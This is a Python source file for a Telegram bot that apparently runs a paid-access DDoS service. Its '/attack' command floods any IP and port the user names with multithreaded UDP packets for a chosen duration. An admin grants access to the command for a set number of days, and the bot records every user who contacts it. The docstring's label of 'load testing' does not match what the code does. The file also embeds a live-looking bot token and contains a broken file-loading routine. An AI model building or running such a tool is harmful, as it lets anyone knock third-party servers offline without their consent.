import telebot
import threading
import socket
import time
import requests
import os
from datetime import datetime, timedelta

# Replace with your Telegram bot token
BOT_TOKEN = "8189083680:AAEaPDkep_jxUo8dcaj4TR6XgvjrVxbHAaI"
# Replace with your Telegram user ID (admin only)
ADMIN_ID = 6353114118

# Initialize the bot
bot = telebot.TeleBot(BOT_TOKEN)

# File paths to persist authorized and all users
AUTHORIZED_USERS_FILE = 'authorized_users.txt'
ALL_USERS_FILE = 'all_users.txt'

# Get the current date and time
def get_current_time():
    return datetime.now().strftime('%Y-%m-%d %H:%M:%S')

# Load authorized users from a file (if exists)
def load_authorized_users():
    if os.path.exists(AUTHORIZED_USERS_FILE):
        with open(AUTHORIZED_USERS_FILE, 'r') as f:
            return {line.strip(): datetime.strptime(date.strip(), '%Y-%m-%d %H:%M:%S') for line, date in zip(f[::2], f[1::2])}
    return {ADMIN_ID: datetime.max}  # Default to admin being the only authorized user

# Save authorized users to a file
def save_authorized_users():
    with open(AUTHORIZED_USERS_FILE, 'w') as f:
        for user_id, expiration in authorized_users.items():
            f.write(f"{user_id}\n{expiration.strftime('%Y-%m-%d %H:%M:%S')}\n")

# Load all users who interacted with the bot from a file (if exists)
def load_all_users():
    if os.path.exists(ALL_USERS_FILE):
        with open(ALL_USERS_FILE, 'r') as f:
            return set(int(line.strip()) for line in f)
    return set()

# Save all users to a file
def save_all_users():
    with open(ALL_USERS_FILE, 'w') as f:
        for user_id in all_users:
            f.write(f"{user_id}\n")

# Initialize user sets
authorized_users = load_authorized_users()
all_users = load_all_users()

def send_packets(ip, port, duration, threads):
    """Simulates sending packets for load testing."""
    end_time = time.time() + duration

    def send():
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            packet = b"X" * 1024  # 1KB packet
            while time.time() < end_time:
                try:
                    sock.sendto(packet, (ip, port))
                except Exception as e:
                    print(f"Error: {e}")

    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=send)
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()

@bot.message_handler(commands=['start'])
def start_command(message):
    # Ensure that the user is added and saved to the all_users list
    all_users.add(message.from_user.id)
    save_all_users()  # Save all users to file
    
    # Reply with current date and time
    bot.reply_to(
        message,
        f"Welcome to the battlefield – where legends are forged. Will you rise to be the one?\n\n"
        f"Current Date and Time: {get_current_time()}\n\n"
        "Commands:\n"
        "/ping <URL> - Check server status\n"
        "/attack <IP> <PORT> <DURATION> <THREADS> - Simulate traffic generation (Admin or authorized users only)\n"
        "/allow <USER_ID> <DAYS> - Allow another user to use restricted commands for a specified number of days (Admin only)\n"
        "/allusers - List all users who have interacted with this bot (Admin only)"
    )

@bot.message_handler(commands=['ping'])
def ping_server(message):
    # Ensure that the user is added and saved to the all_users list
    all_users.add(message.from_user.id)
    save_all_users()  # Save all users to file
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, f"Usage: /ping <URL>")
            return

        url = args[1]
        bot.reply_to(message, f"Pinging {url}...\nCurrent Date and Time: {get_current_time()}")
        start_time = time.time()
        response = requests.get(url, timeout=5)
        end_time = time.time()

        if response.status_code == 200:
            latency = round((end_time - start_time) * 1000, 2)
            bot.reply_to(message, f"✅ {url} is online. Latency: {latency} ms.\nCurrent Date and Time: {get_current_time()}")
        else:
            bot.reply_to(message, f"⚠️ {url} responded with status code: {response.status_code}\nCurrent Date and Time: {get_current_time()}")
    except requests.exceptions.RequestException as e:
        bot.reply_to(message, f"❌ Could not reach {url}. Error: {e}\nCurrent Date and Time: {get_current_time()}")

@bot.message_handler(commands=['attack'])
def attack_command(message):
    # Ensure that the user is added and saved to the all_users list
    all_users.add(message.from_user.id)
    save_all_users()  # Save all users to file
    user_id = message.from_user.id
    if user_id not in authorized_users or authorized_users[user_id] < datetime.now():
        bot.reply_to(message, f"⛔ You do not have permission to use this command.\nCurrent Date and Time: {get_current_time()}")
        return

    args = message.text.split()
    if len(args) != 5:
        bot.reply_to(message, f"Usage: /attack <IP> <PORT> <DURATION> <THREADS>\nCurrent Date and Time: {get_current_time()}")
        return

    try:
        ip = args[1]
        port = int(args[2])
        duration = int(args[3])
        threads = int(args[4])

        bot.reply_to(message, f"⚡ Starting attack on {ip}:{port} for {duration} seconds with {threads} threads...\nCurrent Date and Time: {get_current_time()}")
        threading.Thread(target=send_packets, args=(ip, port, duration, threads)).start()
        bot.reply_to(message, f"✅ Attack simulation started. Check your server's resilience.\nCurrent Date and Time: {get_current_time()}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}\nCurrent Date and Time: {get_current_time()}")

@bot.message_handler(commands=['allow'])
def allow_user(message):
    # Ensure that the user is added and saved to the all_users list
    all_users.add(message.from_user.id)
    save_all_users()  # Save all users to file
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, f"⛔ Only the admin can use this command.\nCurrent Date and Time: {get_current_time()}")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, f"Usage: /allow <USER_ID> <DAYS>\nCurrent Date and Time: {get_current_time()}")
        return

    try:
        user_id = int(args[1])
        days = int(args[2])
        expiration_date = datetime.now() + timedelta(days=days)
        authorized_users[user_id] = expiration_date
        save_authorized_users()  # Save authorized users to file

        bot.reply_to(message, f"✅ User {user_id} is now authorized to use restricted commands for {days} days (until {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}).\nCurrent Date and Time: {get_current_time()}")
    except ValueError:
        bot.reply_to(message, f"❌ Invalid USER_ID or DAYS. Please provide valid numeric values.\nCurrent Date and Time: {get_current_time()}")

@bot.message_handler(commands=['allusers'])
def list_all_users(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, f"⛔ Only the admin can use this command.\nCurrent Date and Time: {get_current_time()}")
        return

    user_list = "\n".join(str(user) for user in all_users)
    bot.reply_to(message, f"👥 All users who interacted with the bot:\n{user_list}\nCurrent Date and Time: {get_current_time()}")

# Start polling for bot messages
print("Bot is running...")
bot.polling()
